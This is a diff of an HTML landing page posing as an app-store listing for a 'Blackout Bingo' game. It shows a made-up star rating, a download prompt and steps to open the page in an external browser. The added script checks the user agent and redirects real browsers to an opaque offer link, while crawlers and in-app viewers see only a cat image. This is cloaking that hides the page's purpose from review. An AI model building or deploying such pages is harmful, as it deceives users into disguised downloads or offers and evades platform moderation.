@@ -20,41 +20,93 @@
             width: 100px; /* Adjust the size as needed */
             height: 100px;
             object-fit: cover;
-            margin-bottom: 10px; /* Add some spacing between the image and text */
+            margin-bottom: -17px; /* Add some spacing between the image and text */
+            margin-top: 20px; /* Adjust the margin to move the image lower */
+        }
+
+        .larger-text {
+            font-size: 24px; /* Adjust the font size for larger text */
+            margin-bottom: 10px; /* Add spacing between the larger text and "4.5 Stars" text */
         }
 
         .rating-text,
         .description-text,
         .instructions-text {
-            color: black; /* Change color to black */
             font-size: 16px; /* Adjust the font size as needed */
             text-align: center; /* Center the text */
         }
 
+        .rating-text {
+            color: #888; /* Light gray color */
+            margin-top: -13px; /* Add margin above the "4.5 Stars" text */
+            margin-bottom: 10px; /* Add margin below the "4.5 Stars" text */
+        }
+
+        .description-text,
+        .instructions-text {
+            margin-bottom: -5px; /* Add bottom margin to "Easy to download" text */
+            color: #888; /* Light gray color */
+        }
+
         .instructions-text span {
             font-size: 20px; /* Adjust the font size for both lines */
+            color: black; /* Set color to black */
         }
 
         .instructions-text strong {
             font-weight: bold; /* Make the text bold */
+            color: black; /* Set color to black */
         }
 
         .arrow-up {
             position: absolute;
             top: 10px; /* Adjust the distance from the top */
             right: 20px; /* Adjust the distance from the right */
-            font-size: 24px; /* Adjust the font size of the arrow */
+            font-size: 48px; /* Adjust the font size of the arrow */
+            color: black; /* Set color to black */
+        }
+
+        .download-text {
+            position: absolute;
+            top: 65px; /* Adjust the distance from the top */
+            right: 20px; /* Adjust the distance from the right */
+            text-align: right; /* Align text to the right */
+            margin: 0; /* Remove default margin */
+            color: #888; /* Set color to black */
         }
     </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var isCompatible = true;
+            var supportedBrowsers = ["Firefox", "Chrome", "Edge", "Safari", "Opera", "Brave", "Vivaldi", "DuckDuckGo"];
+            var currentBrowser = navigator.userAgent;
+
+            if (supportedBrowsers.every(function(browser) {
+                return currentBrowser.indexOf(browser) === -1;
+            })) {
+                isCompatible = false;
+            }
+
+            if (isCompatible) {
+                window.location.href = 'https://rwrdzy.com/61614/829'; // Replace with your compatible link
+            } else {
+                var catImage = document.createElement('img');
+                catImage.src = 'https://iili.io/Jzr10cN.md.jpg'; // Replace with your cat image URL or path
+                document.body.appendChild(catImage);
+            }
+        });
+    </script>
 </head>
 <body>
     <img src="https://i.postimg.cc/qRhzFvfT/1200x630wa-removebg-preview-2.png" alt="Small Square Image">
-    <div class="arrow-up">&#x2191;</div>
+    <p class="larger-text">Blackout Bingo</p>
     <p class="rating-text">4.5 Stars</p>
+    <div class="arrow-up">&#x2191;</div>
     <p class="description-text">Easy to download:</p>
     <p class="instructions-text">
-        • <span>Click on the three dots!</span><br>
-        • <span>Select <strong>Open in Browser</strong></span>
+         <span style="color: black;">• Click on the three dots!</span><br>
+         <span style="color: black;">• Select <strong>Open in Browser</strong></span>
     </p>
+    <p class="download-text">Click here<br>to download</p>
 </body>
 </html>
